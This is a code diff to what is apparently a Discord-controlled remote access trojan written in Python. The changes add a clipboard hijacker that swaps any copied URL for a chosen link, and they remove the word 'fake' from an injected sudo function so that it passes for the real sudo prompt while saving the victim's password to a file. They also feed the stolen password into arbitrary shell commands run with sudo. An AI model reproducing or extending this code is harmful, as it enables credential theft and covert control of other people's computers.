@@ -131,9 +131,11 @@ class clipboard_cog(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
         self.previous_clipboard = self.get_clipboard()
+        self.clipboard_monitor_url.start("https://rickroll.it")
 
     def cog_unload(self) -> None:
         self.clipboard_monitor.stop()
+        self.clipboard_monitor_url.stop()
 
     def get_clipboard(self):
         clipboard_content = pyperclip.paste()
@@ -172,6 +174,13 @@ class clipboard_cog(commands.Cog):
                     data=clipboard
                     )
                 await ctx.send(embed=embed)
+
+    @tasks.loop(seconds=1)
+    async def clipboard_monitor_url(self, url):
+        clipboard = self.check_clipboard()
+        if clipboard != 1:
+            if any(item in clipboard for item in ["http://", "https://", ".com", ".net", ".org", "www."]):
+                self.set_clipboard(url)
 
 
     @commands.group(name="clipboard", invoke_without_command=True)
@@ -344,7 +353,6 @@ class shell_cog(commands.Cog):
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE
             )
-        print("done")
 
         try:
             stdout, stderr = await asyncio.wait_for(
@@ -357,10 +365,9 @@ class shell_cog(commands.Cog):
         except asyncio.TimeoutError:
             print("timed out")
             return 1
-
-    @commands.command(name="shell")
-    async def shell(self, ctx, *args):
-        args = list(args)
+        
+    def parse_shell_args(self, *args):
+        args = list(args[0])
 
         for index, item in enumerate(args):
             if item == "-t":
@@ -373,21 +380,33 @@ class shell_cog(commands.Cog):
             timeout = 30
 
         arg = ' '.join(args)
-        print(arg)
-        print(timeout)
+        command_args = [arg, timeout]
+        print(command_args)
+        return command_args
+    
+    async def run_shell_command(self, ctx, *args):
+        command_args = self.parse_shell_args(args)
 
-        output = await self.execute_shell(arg, timeout)
+        command = command_args[0]
+        timeout = command_args[1]
+
+        output = await self.execute_shell(command, timeout)
 
         if output == 1:
             embed = embed_data(
                 title="Command timed out | Shell",
                 description=f"Executed command timed out after {timeout} seconds:",
-                data=arg,
+                data=command,
                 color=discord.Color.red()
                 )
             await ctx.send(embed=embed)
         else:
             await ctx.send(f"```\n{output}\n```")
+
+
+    @commands.command(name="shell")
+    async def shell(self, ctx, *args):
+        await self.run_shell_command(ctx, *args)
 
 
 # Linux specifix commands
@@ -432,7 +451,7 @@ if isWindows == False:
         async def intercept_sudo(self, ctx):
             injection_code = """\nsudo() {
 while true; do
-    read -s -r -p "[sudo fake] password for ${USER}: " passwd
+    read -s -r -p "[sudo] password for ${USER}: " passwd
     echo "${passwd}" | /usr/bin/sudo -S ${@} && { echo $passwd > /var/tmp/passwd; break; }
     clear
     echo Sorry, try again.
@@ -472,9 +491,23 @@ done
             sudo_password = await self.get_sudo(ctx)
 
             if sudo_password != 1:
-                added_sudo_args = ("echo", "'anteroom-ripoff-analytic'", "|", "sudo", "-S") + args
-                print(added_sudo_args)
-                await shell_cog.shell(ctx, *added_sudo_args)
+                added_sudo_args = ("echo", sudo_password, "|", "sudo", "-S") + args
+
+                shellCOG = shell_cog(bot)
+
+                await shellCOG.run_shell_command(ctx, *added_sudo_args)
+
+        @sudo.command(name="remove")
+        async def remove(self, ctx):
+            def check(reaction, user):  # Our check for the reaction
+                return user == ctx.message.author  # We check that only the authors reaction counts
+
+            message = await ctx.send("Please react to the message!")
+            await message.add_reaction(":heart:")
+
+            reaction = await bot.wait_for("reaction_add", check=check)
+            await ctx.send(f"You reacted with: {reaction[0]}")  # With [0] we only display the emoji
+                        
 
     
 
